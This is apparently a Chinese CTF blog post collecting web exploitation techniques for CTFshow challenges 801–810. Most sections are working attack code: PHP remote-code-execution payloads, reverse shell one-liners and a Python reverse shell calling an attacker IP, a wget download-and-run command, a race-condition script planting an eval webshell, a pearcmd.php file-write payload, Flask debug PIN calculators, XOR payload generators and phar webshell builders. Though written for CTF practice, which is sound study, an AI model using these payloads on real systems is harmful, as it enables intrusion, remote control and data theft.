href="https://blog.csdn.net/qq_45570082/article/details/106602261" >文章</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>利用方式有以下几种</p><ol><li><p><strong>利用session_id</strong></p><p>php中有一个函数叫session_id(),可以直接获取到cookie中的phpsessionid值，phpsessionid的组成符号有限定,不能使用 ’ () ‘，所以我们需要将我们要执行的命令转换成16进制，然后再通过hex2bin函数转换回去，<code>bin2hex(&#39;payload&#39;);</code>来转换16禁止，在使用时通过<code>eval(hex2bin(session_id(session_start())));</code>，在加上请求头中Cookie中的<code>PHPSESSID=16进制payload</code>执行</p></li><li><p><strong>利用<code>get_defined_vars ()</code>函数</strong></p><p><code>get_defined_vars()</code>：返回由所有已定义变量所组成的数组</p><p>可供利用的函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> 将内部指针指向数组中的最后一个元素，并输出。<span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> 将内部指针指向数组中的下一个元素，并输出。<span class="token function">prev</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> 将内部指针指向数组中的上一个元素，并输出。<span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> 将内部指针指向数组中的第一个元素，并输出。<span class="token function">each</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> 返回当前元素的键名和键值，并将内部指针向前移动。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到在已定义的变量中存在着全局变量GET和POST，我们可以通过传入参数来实现RCE</p><pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>文件读取</p><p>可供利用的函数</p><pre class="line-numbers language-none"><code class="language-none">var_dump()  打印所有内容print_r()  同上scandir()  扫描路径内文件名并返回一个迭代器localeconv()  getcwd()  获得当前工作目录getallheaders()  获得请求头内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p><strong>807</strong></p>        <h3 id="反弹shell"   >          <a href="#反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3>      <p>本地监听端口，记住要有公网IP，也可以使用frp内网穿透</p><ol><li><p>公网服务器</p><p>监听命令</p><pre class="line-numbers language-none"><code class="language-none">攻击端nc -lvp 监听的端口受害端bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击端IP&#x2F;攻击端监听端口 0&gt;&amp;1nc 攻击端IP 攻击端监听端口 -t &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用wget下载执行</p><pre class="line-numbers language-none"><code class="language-none">wget 攻击端IP&#x2F;shell.txt -O &#x2F;tmp&#x2F;shell.php &amp;&amp; php &#x2F;tmp&#x2F;shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python脚本反弹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment">#-*- coding: utf-8 -*-</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>oss<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"攻击端IP"</span><span class="token punctuation">,</span>攻击端监听端口<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#更改localhost为⾃⼰的外⽹ip,端⼝任意</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p><strong>808</strong></p>        <h3 id="卡临时文件包含"   >          <a href="#卡临时文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#卡临时文件包含" class="headerlink" title="卡临时文件包含"></a>卡临时文件包含</h3>      <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">import</span> syssession<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>sess<span class="token operator">=</span><span class="token string">'yu22x'</span>url1<span class="token operator">=</span><span class="token string">"http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/"</span>url2<span class="token operator">=</span><span class="token string">'http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/?file=/tmp/sess_yu22x'</span>data1<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span><span class="token punctuation">&#125;</span>data2<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'echo 11123;system("cat /*");'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">&#125;</span>cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sess<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'11123'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    event<span class="token operator">=</span>threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>纯纯看运气</p><p><strong>809</strong></p>        <h3 id="pear文件包含-RCE"   >          <a href="#pear文件包含-RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#pear文件包含-RCE" class="headerlink" title="pear文件包含/RCE"></a>pear文件包含/RCE</h3>      <p>文章<span class="exturl"><a class="exturl__link"   href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html" >在此</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><blockquote><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p><p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p><p>原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p><p>我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</p><p>如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了<code>register_argc_argv</code>，那么这其中是怎么处理的？</p><p>HTTP数据包中的query-string会被作为argv的值</p></blockquote><p>最终构造的payload如下</p><pre class="line-numbers language-none"><code class="language-none">?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;phpinfo()?&gt;+&#x2F;tmp&#x2F;hello.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时/tmp/hello.php文件中就有了我们写入的<code>&lt;?=phpinfo()?&gt;</code>，文件包含即可</p><p><strong>810</strong></p>        <h3 id="SSRF打PHP-FPM"   >          <a href="#SSRF打PHP-FPM" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF打PHP-FPM" class="headerlink" title="SSRF打PHP-FPM"></a>SSRF打PHP-FPM</h3>      <p>有工具不用***</p><pre class="line-numbers language-none"><code class="language-none">title: CTFshow常用姿势date: 2022-06-04 16:20:22tags:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>801</strong></p>        <h3 id="flask计算PIN-1"   >          <a href="#flask计算PIN-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#flask计算PIN-1" class="headerlink" title="flask计算PIN"></a>flask计算PIN</h3>      <p><strong>什么是PIN码</strong></p><p>PIN码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式</p><p><strong>注意事项：谨记！！python 3.8（md5）和3.6（sha1）pin码生成方式不同</strong></p><p><strong>使用条件：flask debug模式开启 存在任意文件读取</strong></p><p>首先是python PIN码的生成脚本</p><pre class="line-numbers language-none"><code class="language-none">#生效时间为一周PIN_TIME &#x3D; 60 * 60 * 24 * 7def hash_pin(pin: str) -&gt; str:    return hashlib.sha1(f&quot;&#123;pin&#125; added salt&quot;.encode(&quot;utf-8&quot;, &quot;replace&quot;)).hexdigest()[:12]_machine_id: t.Optional[t.Union[str, bytes]] &#x3D; None#获取机器号def get_machine_id() -&gt; t.Optional[t.Union[str, bytes]]:    global _machine_id    if _machine_id is not None:        return _machine_id    def _generate() -&gt; t.Optional[t.Union[str, bytes]]:        linux &#x3D; b&quot;&quot;        # machine-id is stable across boots, boot_id is not.        for filename in &quot;&#x2F;etc&#x2F;machine-id&quot;, &quot;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id&quot;:            try:                with open(filename, &quot;rb&quot;) as f:                    value &#x3D; f.readline().strip()            except OSError:                continue            if value:            #读取文件进行拼接                linux +&#x3D; value                break        # Containers share the same machine id, add some cgroup        # information. This is used outside containers too but should be        # relatively stable across boots.        try:            with open(&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;, &quot;rb&quot;) as f:            #继续进行拼接，这里处理一下只要&#x2F;docker后的东西                linux +&#x3D; f.readline().strip().rpartition(b&quot;&#x2F;&quot;)[2]        except OSError:            pass        if linux:            return linux        # On OS X, use ioreg to get the computer&#39;s serial number.        try:            # subprocess may not be available, e.g. Google App Engine            # https:&#x2F;&#x2F;github.com&#x2F;pallets&#x2F;werkzeug&#x2F;issues&#x2F;925            from subprocess import Popen, PIPE            dump &#x3D; Popen(                [&quot;ioreg&quot;, &quot;-c&quot;, &quot;IOPlatformExpertDevice&quot;, &quot;-d&quot;, &quot;2&quot;], stdout&#x3D;PIPE            ).communicate()[0]            match &#x3D; re.search(b&#39;&quot;serial-number&quot; &#x3D; &lt;([^&gt;]+)&#39;, dump)            if match is not None:                return match.group(1)        except (OSError, ImportError):            pass        # On Windows, use winreg to get the machine guid.        if sys.platform &#x3D;&#x3D; &quot;win32&quot;:            import winreg            try:                with winreg.OpenKey(                    winreg.HKEY_LOCAL_MACHINE,                    &quot;SOFTWARE\\Microsoft\\Cryptography&quot;,                    0,                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,                ) as rk:                    guid: t.Union[str, bytes]                    guid_type: int                    guid, guid_type &#x3D; winreg.QueryValueEx(rk, &quot;MachineGuid&quot;)                    if guid_type &#x3D;&#x3D; winreg.REG_SZ:                        return guid.encode(&quot;utf-8&quot;)                    return guid            except OSError:                pass        return None    _machine_id &#x3D; _generate()    return _machine_idclass _ConsoleFrame:    &quot;&quot;&quot;Helper class so that we can reuse the frame console code for the    standalone console.    &quot;&quot;&quot;    def __init__(self, namespace: t.Dict[str, t.Any]):        self.console &#x3D; Console(namespace)        self.id &#x3D; 0def get_pin_and_cookie_name(    app: &quot;WSGIApplication&quot;,) -&gt; t.Union[t.Tuple[str, str], t.Tuple[None, None]]:    &quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin    code and a random key.  The hope is that this is stable between    restarts to not make debugging particularly frustrating.  If the pin    was forcefully disabled this returns &#96;None&#96;.    Second item in the resulting tuple is the cookie name for remembering.    &quot;&quot;&quot;    pin &#x3D; os.environ.get(&quot;WERKZEUG_DEBUG_PIN&quot;)    rv &#x3D; None    num &#x3D; None    # Pin was explicitly disabled    if pin &#x3D;&#x3D; &quot;off&quot;:        return None, None    # Pin was provided explicitly    if pin is not None and pin.replace(&quot;-&quot;, &quot;&quot;).isdigit():        # If there are separators in the pin, return it directly        if &quot;-&quot; in pin:            rv &#x3D; pin        else:            num &#x3D; pin    modname &#x3D; getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)    username: t.Optional[str]    try:        # getuser imports the pwd module, which does not exist in Google        # App Engine. It may also raise a KeyError if the UID does not        # have a username, such as in Docker.        username &#x3D; getpass.getuser()    except (ImportError, KeyError):        username &#x3D; None    mod &#x3D; sys.modules.get(modname)    # This information only exists to make the cookie unique on the    # computer, not as a security feature.    probably_public_bits &#x3D; [        username,        modname,        getattr(app, &quot;__name__&quot;, type(app).__name__),        getattr(mod, &quot;__file__&quot;, None),    ]    # This information is here to make it harder for an attacker to    # guess the cookie name.  They are unlikely to be contained anywhere    # within the unauthenticated debug page.    private_bits &#x3D; [str(uuid.getnode()), get_machine_id()]    h &#x3D; hashlib.sha1()    for bit in chain(probably_public_bits, private_bits):        if not bit:            continue        if isinstance(bit, str):            bit &#x3D; bit.encode(&quot;utf-8&quot;)        h.update(bit)    h.update(b&quot;cookiesalt&quot;)    cookie_name &#x3D; f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;    # If we need to generate a pin we salt it a bit more so that we don&#39;t    # end up with the same value and generate out 9 digits    if num is None:        h.update(b&quot;pinsalt&quot;)        num &#x3D; f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]    # Format the pincode in groups of digits for easier remembering if    # we don&#39;t have a result yet.    if rv is None:        for group_size in 5, 4, 3:            if len(num) % group_size &#x3D;&#x3D; 0:                rv &#x3D; &quot;-&quot;.join(                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)                    for x in range(0, len(num), group_size)                )                break        else:            rv &#x3D; num    return rv, cookie_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由上可以看得出PIN值生成所需要获取的数据有</p><ul><li>username，用户名</li><li>modname，默认值为flask.app</li><li>appname，默认值为Flask</li><li>moddir，flask库下app.py的绝对路径</li><li>uuidnode，当前网络的mac地址的十进制数</li><li>machine_id，docker机器id或本机id</li></ul><p>首先是用户名</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png" alt="img"></p><p>可用的似乎只有root</p><p>下面三项任意报错即可获得</p><p>mac地址</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png" alt="img"></p><p>Machine_id</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png" alt="img"></p><p>本机生成脚本如下</p><pre class="line-numbers language-none"><code class="language-none">#MD5import hashlibfrom itertools import chainprobably_public_bits &#x3D; [     &#39;flaskweb&#39;# username     &#39;flask.app&#39;,# modname     &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))     &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),]private_bits &#x3D; [     &#39;25214234362297&#39;,# str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address     &#39;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id]h &#x3D; hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit &#x3D; bit.encode(&#39;utf-8&#39;)    h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None:   h.update(b&#39;pinsalt&#39;)   num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None:   for group_size in 5, 4, 3:       if len(num) % group_size &#x3D;&#x3D; 0:          rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)                      for x in range(0, len(num), group_size))          break       else:          rv &#x3D; numprint(rv)#sha1import hashlibfrom itertools import chainprobably_public_bits &#x3D; [    &#39;root&#39;# &#x2F;etc&#x2F;passwd    &#39;flask.app&#39;,# 默认值    &#39;Flask&#39;,# 默认值    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # 报错得到]private_bits &#x3D; [    &#39;2485377581187&#39;,#  &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 16进制转10进制    #machine_id由三个合并(docker就后两个)：1.&#x2F;etc&#x2F;machine-id 2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id 3.&#x2F;proc&#x2F;self&#x2F;cgroup    &#39;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#39;#  &#x2F;proc&#x2F;self&#x2F;cgroup]h &#x3D; hashlib.sha1()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit &#x3D; bit.encode(&#39;utf-8&#39;)    h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None:    h.update(b&#39;pinsalt&#39;)    num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size &#x3D;&#x3D; 0:            rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)                          for x in range(0, len(num), group_size))            break    else:        rv &#x3D; numprint(rv)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用最终生成的PIN进入代码调试，RCE</p><p><strong>802</strong></p>        <h3 id="无字母数字命令执行-1"   >          <a href="#无字母数字命令执行-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#无字母数字命令执行-1" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h3>      <p>异或法，偷个脚本喵喵</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;*author yu22x*&#x2F;$myfile &#x3D; fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);$contents&#x3D;&quot;&quot;;for ($i&#x3D;0; $i &lt; 256; $i++) &#123;    for ($j&#x3D;0; $j &lt;256 ; $j++) &#123;        if($i&lt;16)&#123;            $hex_i&#x3D;&#39;0&#39;.dechex($i);        &#125;        else&#123;            $hex_i&#x3D;dechex($i);        &#125;        if($j&lt;16)&#123;            $hex_j&#x3D;&#39;0&#39;.dechex($j);        &#125;        else&#123;            $hex_j&#x3D;dechex($j);        &#125;        $preg &#x3D; &#39;&#x2F;[a-z0-9]&#x2F;i&#39;; &#x2F;&#x2F;根据题目给的正则表达式修改即可        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;            echo &quot;&quot;;        &#125;        else&#123;            $a&#x3D;&#39;%&#39;.$hex_i;            $b&#x3D;&#39;%&#39;.$hex_j;            $c&#x3D;(urldecode($a)^urldecode($b));            if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) &#123;                $contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;            &#125;        &#125;    &#125;&#125;fwrite($myfile,$contents);fclose($myfile);# -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1&#x3D;&quot;&quot;   s2&#x3D;&quot;&quot;   for i in arg:       f&#x3D;open(&quot;xor_rce.txt&quot;,&quot;r&quot;)       while True:           t&#x3D;f.readline()           if t&#x3D;&#x3D;&quot;&quot;:               break           if t[0]&#x3D;&#x3D;i:               #print(i)               s1+&#x3D;t[2:5]               s2+&#x3D;t[6:9]               break       f.close()   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param&#x3D;action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>803</strong></p>        <h3 id="phar文件包含-1"   >          <a href="#phar文件包含-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#phar文件包含-1" class="headerlink" title="phar文件包含"></a>phar文件包含</h3>      <p>来自大佬的提示：把phar当压缩包用就行</p><p>首先生成包含一句话木马的phar文件</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;); &#x2F;&#x2F;设置stub$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;&lt;?php system($_POST[a]);?&gt;&#39;); &#x2F;&#x2F;$phar-&gt;stopBuffering();&#x2F;&#x2F; phar生成?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时phar包中的test.txt中的内容就是我们的一句话木马了</p><p>上传文件（记得读取然后url编码一下）</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;&#x2F;tmp&#x2F;phar.phar&amp;content&#x3D;%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>include干</p><p><img   src="file:///Users/jlan/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-06-06%2020.00.48.png?lastModify=1654679483" style=""  alt="截屏2022-06-06 20.00.48"></p><p><strong>804</strong></p>        <h3 id="phar反序列化-1"   >          <a href="#phar反序列化-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#phar反序列化-1" class="headerlink" title="phar反序列化"></a>phar反序列化</h3>      <p>这不用教吧</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass hacker&#123;    public $code;&#125;&#x2F;&#x2F; @unlink(&quot;phar.phar&quot;);$phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar&#x2F;&#x2F; $phar &#x3D; $phar-&gt;convertToExecutable(Phar::TAR, Phar::GZ); &#x2F;&#x2F;压缩规避敏感字符$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); 